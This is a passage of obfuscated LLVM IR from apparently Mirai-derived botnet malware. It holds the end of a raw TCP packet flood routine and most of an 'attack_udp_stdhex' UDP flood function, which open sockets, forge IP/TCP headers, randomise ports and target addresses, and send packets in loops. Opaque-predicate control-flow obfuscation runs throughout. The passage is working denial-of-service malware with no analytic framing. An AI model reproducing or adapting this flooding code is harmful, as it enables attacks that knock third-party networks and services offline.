  %528 = load i32, i32* %26, align 4
  %529 = sext i32 %528 to i64
  %530 = add i64 20, %529
  %531 = trunc i64 %530 to i16
  %532 = call zeroext i16 @htons(i16 zeroext %531) #7
  %533 = load i32, i32* %26, align 4
  %534 = sext i32 %533 to i64
  %535 = add i64 20, %534
  %536 = trunc i64 %535 to i32
  %537 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %525, i8* %527, i16 zeroext %532, i32 %536)
  %538 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %539 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %538, i32 0, i32 6
  store i16 %537, i16* %539, align 4
  %540 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %541 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %540, i32 0, i32 1
  %542 = load i16, i16* %541, align 2
  %543 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %544 = load i32, i32* %9, align 4
  %545 = sext i32 %544 to i64
  %546 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %543, i64 %545
  %547 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %546, i32 0, i32 0
  %548 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %547, i32 0, i32 1
  store i16 %542, i16* %548, align 2
  %549 = load i32, i32* %10, align 4
  %550 = load i8*, i8** %32, align 8
  %551 = load i32, i32* %26, align 4
  %552 = sext i32 %551 to i64
  %553 = add i64 40, %552
  %554 = bitcast %union.__CONST_SOCKADDR_ARG* %36 to %struct.sockaddr**
  %555 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %556 = load i32, i32* %9, align 4
  %557 = sext i32 %556 to i64
  %558 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %555, i64 %557
  %559 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %558, i32 0, i32 0
  %560 = bitcast %struct.sockaddr_in* %559 to %struct.sockaddr*
  store %struct.sockaddr* %560, %struct.sockaddr** %554, align 8
  %561 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %36, i32 0, i32 0
  %562 = load %struct.sockaddr*, %struct.sockaddr** %561, align 8
  %563 = call i64 @sendto(i32 %549, i8* %550, i64 %553, i32 16384, %struct.sockaddr* %562, i32 16)
  br label %564

; <label>:564:                                    ; preds = %515
  %565 = load i32, i32* %9, align 4
  %566 = add nsw i32 %565, 1
  store i32 %566, i32* %9, align 4
  br label %330

; <label>:567:                                    ; preds = %330
  br label %313

; <label>:568:                                    ; preds = %114, %108
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %123
  %569 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %570 = load i8**, i8*** %11, align 8
  %571 = load i32, i32* %9, align 4
  %572 = sext i32 %571 to i64
  %573 = getelementptr inbounds i8*, i8** %570, i64 %572
  store i8* %569, i8** %573, align 8
  %574 = load i8**, i8*** %11, align 8
  %575 = load i32, i32* %9, align 4
  %576 = sext i32 %575 to i64
  %577 = getelementptr inbounds i8*, i8** %574, i64 %576
  %578 = load i8*, i8** %577, align 8
  %579 = bitcast i8* %578 to %struct.iphdr*
  store %struct.iphdr* %579, %struct.iphdr** %29, align 8
  %580 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %581 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %580, i64 1
  %582 = bitcast %struct.iphdr* %581 to %struct.tcphdr*
  store %struct.tcphdr* %582, %struct.tcphdr** %30, align 8
  %583 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %584 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %583, i64 1
  %585 = bitcast %struct.tcphdr* %584 to i8*
  store i8* %585, i8** %31, align 8
  %586 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %587 = bitcast %struct.iphdr* %586 to i8*
  %588 = load i8, i8* %587, align 4
  %_ = shl i8 %588, 15
  %_1 = shl i8 %588, 15
  %_2 = sub i8 %588, 15
  %gen = mul i8 %_2, 15
  %_3 = sub i8 %588, 15
  %gen4 = mul i8 %_3, 15
  %_5 = sub i8 %588, 15
  %gen6 = mul i8 %_5, 15
  %589 = and i8 %588, 15
  %_7 = shl i8 %589, 64
  %_8 = sub i8 0, %589
  %gen9 = add i8 %_8, 64
  %590 = or i8 %589, 64
  store i8 %590, i8* %587, align 4
  %591 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %592 = bitcast %struct.iphdr* %591 to i8*
  %593 = load i8, i8* %592, align 4
  %_10 = sub i8 %593, -16
  %gen11 = mul i8 %_10, -16
  %_12 = sub i8 %593, -16
  %gen13 = mul i8 %_12, -16
  %_14 = sub i8 %593, -16
  %gen15 = mul i8 %_14, -16
  %_16 = shl i8 %593, -16
  %_17 = sub i8 %593, -16
  %gen18 = mul i8 %_17, -16
  %_19 = sub i8 %593, -16
  %gen20 = mul i8 %_19, -16
  %_21 = sub i8 0, %593
  %gen22 = add i8 %_21, -16
  %_23 = shl i8 %593, -16
  %_24 = shl i8 %593, -16
  %594 = and i8 %593, -16
  %_25 = sub i8 0, %594
  %gen26 = add i8 %_25, 5
  %_27 = sub i8 0, %594
  %gen28 = add i8 %_27, 5
  %_29 = sub i8 0, %594
  %gen30 = add i8 %_29, 5
  %595 = or i8 %594, 5
  store i8 %595, i8* %592, align 4
  %596 = load i8, i8* %12, align 1
  %597 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %598 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %597, i32 0, i32 1
  store i8 %596, i8* %598, align 1
  %599 = load i32, i32* %26, align 4
  %600 = sext i32 %599 to i64
  %_31 = shl i64 40, %600
  %_32 = sub i64 40, %600
  %gen33 = mul i64 %_32, %600
  %_34 = shl i64 40, %600
  %_35 = sub i64 0, 40
  %gen36 = add i64 %_35, %600
  %_37 = shl i64 40, %600
  %_38 = shl i64 40, %600
  %_39 = sub i64 0, 40
  %gen40 = add i64 %_39, %600
  %_41 = shl i64 40, %600
  %601 = add i64 40, %600
  %602 = trunc i64 %601 to i16
  %603 = call zeroext i16 @htons(i16 zeroext %602) #7
  %604 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %605 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %604, i32 0, i32 2
  store i16 %603, i16* %605, align 2
  %606 = load i16, i16* %13, align 2
  %607 = call zeroext i16 @htons(i16 zeroext %606) #7
  %608 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %609 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %608, i32 0, i32 3
  store i16 %607, i16* %609, align 4
  %610 = load i8, i8* %14, align 1
  %611 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %612 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %611, i32 0, i32 5
  store i8 %610, i8* %612, align 4
  %613 = load i8, i8* %15, align 1
  %614 = icmp ne i8 %613, 0
  br label %originalBB

originalBB42alteredBB:                            ; preds = %originalBB42, %296
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %313
  store i32 0, i32* %9, align 4
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %378
  %615 = load i32, i32* %28, align 4
  %616 = icmp eq i32 %615, -1
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %421
  %617 = load i16, i16* %17, align 2
  %618 = zext i16 %617 to i32
  %619 = icmp eq i32 %618, 65535
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %441
  %620 = call i32 @rand_next()
  %_59 = sub i32 %620, 65535
  %gen60 = mul i32 %_59, 65535
  %_61 = sub i32 %620, 65535
  %gen62 = mul i32 %_61, 65535
  %_63 = shl i32 %620, 65535
  %_64 = sub i32 %620, 65535
  %gen65 = mul i32 %_64, 65535
  %_66 = sub i32 %620, 65535
  %gen67 = mul i32 %_66, 65535
  %_68 = sub i32 %620, 65535
  %gen69 = mul i32 %_68, 65535
  %621 = and i32 %620, 65535
  %622 = trunc i32 %621 to i16
  %623 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %624 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %623, i32 0, i32 1
  store i16 %622, i16* %624, align 2
  br label %originalBB58

originalBB73alteredBB:                            ; preds = %originalBB73, %463
  %625 = load i32, i32* %18, align 4
  %626 = icmp eq i32 %625, 65535
  br label %originalBB73

originalBB77alteredBB:                            ; preds = %originalBB77, %486
  %627 = load i32, i32* %19, align 4
  %628 = icmp eq i32 %627, 65535
  br label %originalBB77
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_stdhex(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca [256 x i8*], align 16
  %20 = alloca i8*, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %23 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %24 = load i8, i8* %5, align 1
  %25 = zext i8 %24 to i64
  %26 = call noalias i8* @calloc(i64 %25, i64 8) #6
  %27 = bitcast i8* %26 to i8**
  store i8** %27, i8*** %10, align 8
  %28 = load i8, i8* %5, align 1
  %29 = zext i8 %28 to i64
  %30 = call noalias i8* @calloc(i64 %29, i64 4) #6
  %31 = bitcast i8* %30 to i32*
  store i32* %31, i32** %11, align 8
  %32 = load i8, i8* %7, align 1
  %33 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %34 = call i32 @attack_get_opt_int(i8 zeroext %32, %struct.attack_option* %33, i8 zeroext 7, i32 65535)
  %35 = trunc i32 %34 to i16
  store i16 %35, i16* %12, align 2
  %36 = load i8, i8* %7, align 1
  %37 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %38 = call i32 @attack_get_opt_int(i8 zeroext %36, %struct.attack_option* %37, i8 zeroext 6, i32 65535)
  %39 = trunc i32 %38 to i16
  store i16 %39, i16* %13, align 2
  %40 = load i8, i8* %7, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %42 = call i32 @attack_get_opt_int(i8 zeroext %40, %struct.attack_option* %41, i8 zeroext 0, i32 1458)
  %43 = trunc i32 %42 to i16
  store i16 %43, i16* %14, align 2
  %44 = load i8, i8* %7, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 1, i32 1)
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* %15, align 1
  %48 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* %48, i8 0, i64 16, i32 4, i1 false)
  %49 = load i16, i16* %13, align 2
  %50 = zext i16 %49 to i32
  %51 = icmp eq i32 %50, 65535
  br i1 %51, label %52, label %71

; <label>:52:                                     ; preds = %4
  %53 = load i32, i32* @x.25
  %54 = load i32, i32* @y.26
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %52
  %61 = call i32 @rand_next()
  %62 = trunc i32 %61 to i16
  store i16 %62, i16* %13, align 2
  %63 = load i32, i32* @x.25
  %64 = load i32, i32* @y.26
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %90

; <label>:71:                                     ; preds = %4
  %72 = load i32, i32* @x.25
  %73 = load i32, i32* @y.26
  %74 = sub i32 %72, 1
  %75 = mul i32 %72, %74
  %76 = urem i32 %75, 2
  %77 = icmp eq i32 %76, 0
  %78 = icmp slt i32 %73, 10
  %79 = or i1 %77, %78
  br i1 %79, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %71
  %80 = load i16, i16* %13, align 2
  %81 = call zeroext i16 @htons(i16 zeroext %80) #7
  store i16 %81, i16* %13, align 2
  %82 = load i32, i32* @x.25
  %83 = load i32, i32* @y.26
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %90

; <label>:90:                                     ; preds = %originalBBpart24, %originalBBpart2
  store i32 0, i32* %9, align 4
  br label %91

; <label>:91:                                     ; preds = %originalBBpart244, %90
  %92 = load i32, i32* @x.25
  %93 = load i32, i32* @y.26
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %91
  %100 = load i32, i32* %9, align 4
  %101 = load i8, i8* %5, align 1
  %102 = zext i8 %101 to i32
  %103 = icmp slt i32 %100, %102
  %104 = load i32, i32* @x.25
  %105 = load i32, i32* @y.26
  %106 = sub i32 %104, 1
  %107 = mul i32 %104, %106
  %108 = urem i32 %107, 2
  %109 = icmp eq i32 %108, 0
  %110 = icmp slt i32 %105, 10
  %111 = or i1 %109, %110
  br i1 %111, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %103, label %112, label %308

; <label>:112:                                    ; preds = %originalBBpart28
  %113 = bitcast [256 x i8*]* %19 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %113, i8* bitcast ([256 x i8*]* @attack_udp_stdhex.leon_hex to i8*), i64 2048, i32 16, i1 false)
  %114 = call i32 @rand() #6
  %115 = srem i32 %114, 256
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds [256 x i8*], [256 x i8*]* %19, i64 0, i64 %116
  %118 = load i8*, i8** %117, align 8
  store i8* %118, i8** %20, align 8
  %119 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %120 = load i8**, i8*** %10, align 8
  %121 = load i32, i32* %9, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i8*, i8** %120, i64 %122
  store i8* %119, i8** %123, align 8
  %124 = load i16, i16* %12, align 2
  %125 = zext i16 %124 to i32
  %126 = icmp eq i32 %125, 65535
  br i1 %126, label %127, label %136

; <label>:127:                                    ; preds = %112
  %128 = call i32 @rand_next()
  %129 = trunc i32 %128 to i16
  %130 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %131 = load i32, i32* %9, align 4
  %132 = sext i32 %131 to i64
  %133 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %130, i64 %132
  %134 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %133, i32 0, i32 0
  %135 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %134, i32 0, i32 1
  store i16 %129, i16* %135, align 2
  br label %145

; <label>:136:                                    ; preds = %112
  %137 = load i16, i16* %12, align 2
  %138 = call zeroext i16 @htons(i16 zeroext %137) #7
  %139 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %140 = load i32, i32* %9, align 4
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %139, i64 %141
  %143 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %142, i32 0, i32 0
  %144 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %143, i32 0, i32 1
  store i16 %138, i16* %144, align 2
  br label %145

; <label>:145:                                    ; preds = %136, %127
  %146 = load i32, i32* @x.25
  %147 = load i32, i32* @y.26
  %148 = sub i32 %146, 1
  %149 = mul i32 %146, %148
  %150 = urem i32 %149, 2
  %151 = icmp eq i32 %150, 0
  %152 = icmp slt i32 %147, 10
  %153 = or i1 %151, %152
  br i1 %153, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %145
  %154 = call i32 @socket(i32 2, i32 2, i32 0) #6
  %155 = load i32*, i32** %11, align 8
  %156 = load i32, i32* %9, align 4
  %157 = sext i32 %156 to i64
  %158 = getelementptr inbounds i32, i32* %155, i64 %157
  store i32 %154, i32* %158, align 4
  %159 = icmp eq i32 %154, -1
  %160 = load i32, i32* @x.25
  %161 = load i32, i32* @y.26
  %162 = sub i32 %160, 1
  %163 = mul i32 %160, %162
  %164 = urem i32 %163, 2
  %165 = icmp eq i32 %164, 0
  %166 = icmp slt i32 %161, 10
  %167 = or i1 %165, %166
  br i1 %167, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %159, label %168, label %169

; <label>:168:                                    ; preds = %originalBBpart212
  ret void

; <label>:169:                                    ; preds = %originalBBpart212
  %170 = load i32, i32* @x.25
  %171 = load i32, i32* @y.26
  %172 = sub i32 %170, 1
  %173 = mul i32 %170, %172
  %174 = urem i32 %173, 2
  %175 = icmp eq i32 %174, 0
  %176 = icmp slt i32 %171, 10
  %177 = or i1 %175, %176
  br i1 %177, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %169
  %178 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %178, align 4
  %179 = load i16, i16* %13, align 2
  %180 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %179, i16* %180, align 2
  %181 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %182 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %181, i32 0, i32 0
  store i32 0, i32* %182, align 4
  %183 = load i32*, i32** %11, align 8
  %184 = load i32, i32* %9, align 4
  %185 = sext i32 %184 to i64
  %186 = getelementptr inbounds i32, i32* %183, i64 %185
  %187 = load i32, i32* %186, align 4
  %188 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %189 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %189, %struct.sockaddr** %188, align 8
  %190 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %191 = load %struct.sockaddr*, %struct.sockaddr** %190, align 8
  %192 = call i32 @bind(i32 %187, %struct.sockaddr* %191, i32 16) #6
  %193 = icmp eq i32 %192, -1
  %194 = load i32, i32* @x.25
  %195 = load i32, i32* @y.26
  %196 = sub i32 %194, 1
  %197 = mul i32 %194, %196
  %198 = urem i32 %197, 2
  %199 = icmp eq i32 %198, 0
  %200 = icmp slt i32 %195, 10
  %201 = or i1 %199, %200
  br i1 %201, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %193, label %202, label %203

; <label>:202:                                    ; preds = %originalBBpart216
  br label %203

; <label>:203:                                    ; preds = %202, %originalBBpart216
  %204 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %205 = load i32, i32* %9, align 4
  %206 = sext i32 %205 to i64
  %207 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %204, i64 %206
  %208 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %207, i32 0, i32 2
  %209 = load i8, i8* %208, align 4
  %210 = zext i8 %209 to i32
  %211 = icmp slt i32 %210, 32
  br i1 %211, label %212, label %254

; <label>:212:                                    ; preds = %203
  %213 = load i32, i32* @x.25
  %214 = load i32, i32* @y.26
  %215 = sub i32 %213, 1
  %216 = mul i32 %213, %215
  %217 = urem i32 %216, 2
  %218 = icmp eq i32 %217, 0
  %219 = icmp slt i32 %214, 10
  %220 = or i1 %218, %219
  br i1 %220, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %212
  %221 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %222 = load i32, i32* %9, align 4
  %223 = sext i32 %222 to i64
  %224 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %221, i64 %223
  %225 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %224, i32 0, i32 1
  %226 = load i32, i32* %225, align 4
  %227 = call i32 @ntohl(i32 %226) #7
  %228 = call i32 @rand_next()
  %229 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %230 = load i32, i32* %9, align 4
  %231 = sext i32 %230 to i64
  %232 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %229, i64 %231
  %233 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %232, i32 0, i32 2
  %234 = load i8, i8* %233, align 4
  %235 = zext i8 %234 to i32
  %236 = lshr i32 %228, %235
  %237 = add i32 %227, %236
  %238 = call i32 @htonl(i32 %237) #7
  %239 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %240 = load i32, i32* %9, align 4
  %241 = sext i32 %240 to i64
  %242 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %239, i64 %241
  %243 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %242, i32 0, i32 0
  %244 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %243, i32 0, i32 2
  %245 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %244, i32 0, i32 0
  store i32 %238, i32* %245, align 4
  %246 = load i32, i32* @x.25
  %247 = load i32, i32* @y.26
  %248 = sub i32 %246, 1
  %249 = mul i32 %246, %248
  %250 = urem i32 %249, 2
  %251 = icmp eq i32 %250, 0
  %252 = icmp slt i32 %247, 10
  %253 = or i1 %251, %252
  br i1 %253, label %originalBBpart235, label %originalBB18alteredBB

originalBBpart235:                                ; preds = %originalBB18
  br label %254

; <label>:254:                                    ; preds = %originalBBpart235, %203
  %255 = load i32, i32* @x.25
  %256 = load i32, i32* @y.26
  %257 = sub i32 %255, 1
  %258 = mul i32 %255, %257
  %259 = urem i32 %258, 2
  %260 = icmp eq i32 %259, 0
  %261 = icmp slt i32 %256, 10
  %262 = or i1 %260, %261
  br i1 %262, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %254
  %263 = load i32*, i32** %11, align 8
  %264 = load i32, i32* %9, align 4
  %265 = sext i32 %264 to i64
  %266 = getelementptr inbounds i32, i32* %263, i64 %265
  %267 = load i32, i32* %266, align 4
  %268 = bitcast %union.__CONST_SOCKADDR_ARG* %22 to %struct.sockaddr**
  %269 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %270 = load i32, i32* %9, align 4
  %271 = sext i32 %270 to i64
  %272 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %269, i64 %271
  %273 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %272, i32 0, i32 0
  %274 = bitcast %struct.sockaddr_in* %273 to %struct.sockaddr*
  store %struct.sockaddr* %274, %struct.sockaddr** %268, align 8
  %275 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %22, i32 0, i32 0
  %276 = load %struct.sockaddr*, %struct.sockaddr** %275, align 8
  %277 = call i32 @connect(i32 %267, %struct.sockaddr* %276, i32 16)
  %278 = icmp eq i32 %277, -1
  %279 = load i32, i32* @x.25
  %280 = load i32, i32* @y.26
  %281 = sub i32 %279, 1
  %282 = mul i32 %279, %281
  %283 = urem i32 %282, 2
  %284 = icmp eq i32 %283, 0
  %285 = icmp slt i32 %280, 10
  %286 = or i1 %284, %285
  br i1 %286, label %originalBBpart239, label %originalBB37alteredBB

originalBBpart239:                                ; preds = %originalBB37
  br i1 %278, label %287, label %288

; <label>:287:                                    ; preds = %originalBBpart239
  br label %288

; <label>:288:                                    ; preds = %287, %originalBBpart239
  br label %289

; <label>:289:                                    ; preds = %288
  %290 = load i32, i32* @x.25
  %291 = load i32, i32* @y.26
  %292 = sub i32 %290, 1
  %293 = mul i32 %290, %292
  %294 = urem i32 %293, 2
  %295 = icmp eq i32 %294, 0
  %296 = icmp slt i32 %291, 10
  %297 = or i1 %295, %296
  br i1 %297, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %289
  %298 = load i32, i32* %9, align 4
  %299 = add nsw i32 %298, 1
  store i32 %299, i32* %9, align 4
  %300 = load i32, i32* @x.25
  %301 = load i32, i32* @y.26
  %302 = sub i32 %300, 1
  %303 = mul i32 %300, %302
  %304 = urem i32 %303, 2
  %305 = icmp eq i32 %304, 0
  %306 = icmp slt i32 %301, 10
  %307 = or i1 %305, %306
  br i1 %307, label %originalBBpart244, label %originalBB41alteredBB

originalBBpart244:                                ; preds = %originalBB41
  br label %91

; <label>:308:                                    ; preds = %originalBBpart28
  br label %309

; <label>:309:                                    ; preds = %388, %308
  store i32 0, i32* %9, align 4
  br label %310

; <label>:310:                                    ; preds = %originalBBpart256, %309
  %311 = load i32, i32* @x.25
  %312 = load i32, i32* @y.26
  %313 = sub i32 %311, 1
  %314 = mul i32 %311, %313
  %315 = urem i32 %314, 2
  %316 = icmp eq i32 %315, 0
  %317 = icmp slt i32 %312, 10
  %318 = or i1 %316, %317
  br i1 %318, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %310
  %319 = load i32, i32* %9, align 4
  %320 = load i8, i8* %5, align 1
  %321 = zext i8 %320 to i32
  %322 = icmp slt i32 %319, %321
  %323 = load i32, i32* @x.25
  %324 = load i32, i32* @y.26
  %325 = sub i32 %323, 1
  %326 = mul i32 %323, %325
  %327 = urem i32 %326, 2
  %328 = icmp eq i32 %327, 0
  %329 = icmp slt i32 %324, 10
  %330 = or i1 %328, %329
  br i1 %330, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br i1 %322, label %331, label %388

; <label>:331:                                    ; preds = %originalBBpart248
  %332 = load i8**, i8*** %10, align 8
  %333 = load i32, i32* %9, align 4
  %334 = sext i32 %333 to i64
  %335 = getelementptr inbounds i8*, i8** %332, i64 %334
  %336 = load i8*, i8** %335, align 8
  store i8* %336, i8** %23, align 8
  %337 = load i8, i8* %15, align 1
  %338 = icmp ne i8 %337, 0
  br i1 %338, label %339, label %359

; <label>:339:                                    ; preds = %331
  %340 = load i32, i32* @x.25
  %341 = load i32, i32* @y.26
  %342 = sub i32 %340, 1
  %343 = mul i32 %340, %342
  %344 = urem i32 %343, 2
  %345 = icmp eq i32 %344, 0
  %346 = icmp slt i32 %341, 10
  %347 = or i1 %345, %346
  br i1 %347, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %339
  %348 = load i8*, i8** %23, align 8
  %349 = load i16, i16* %14, align 2
  %350 = zext i16 %349 to i32
  call void @rand_str(i8* %348, i32 %350)
  %351 = load i32, i32* @x.25
  %352 = load i32, i32* @y.26
  %353 = sub i32 %351, 1
  %354 = mul i32 %351, %353
  %355 = urem i32 %354, 2
  %356 = icmp eq i32 %355, 0
  %357 = icmp slt i32 %352, 10
  %358 = or i1 %356, %357
  br i1 %358, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br label %359

; <label>:359:                                    ; preds = %originalBBpart252, %331
  %360 = load i32*, i32** %11, align 8
  %361 = load i32, i32* %9, align 4
  %362 = sext i32 %361 to i64
  %363 = getelementptr inbounds i32, i32* %360, i64 %362
  %364 = load i32, i32* %363, align 4
  %365 = load i8*, i8** %23, align 8
  %366 = load i16, i16* %14, align 2
  %367 = zext i16 %366 to i64
  %368 = call i64 @send(i32 %364, i8* %365, i64 %367, i32 16384)
  br label %369

; <label>:369:                                    ; preds = %359
  %370 = load i32, i32* @x.25
  %371 = load i32, i32* @y.26
  %372 = sub i32 %370, 1
  %373 = mul i32 %370, %372
  %374 = urem i32 %373, 2
  %375 = icmp eq i32 %374, 0
  %376 = icmp slt i32 %371, 10
  %377 = or i1 %375, %376
  br i1 %377, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %369
  %378 = load i32, i32* %9, align 4
  %379 = add nsw i32 %378, 1
  store i32 %379, i32* %9, align 4
  %380 = load i32, i32* @x.25
  %381 = load i32, i32* @y.26
  %382 = sub i32 %380, 1
  %383 = mul i32 %380, %382
  %384 = urem i32 %383, 2
  %385 = icmp eq i32 %384, 0
  %386 = icmp slt i32 %381, 10
  %387 = or i1 %385, %386
  br i1 %387, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br label %310

; <label>:388:                                    ; preds = %originalBBpart248
  br label %309

originalBBalteredBB:                              ; preds = %originalBB, %52
  %389 = call i32 @rand_next()
  %390 = trunc i32 %389 to i16
  store i16 %390, i16* %13, align 2
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %71
  %391 = load i16, i16* %13, align 2
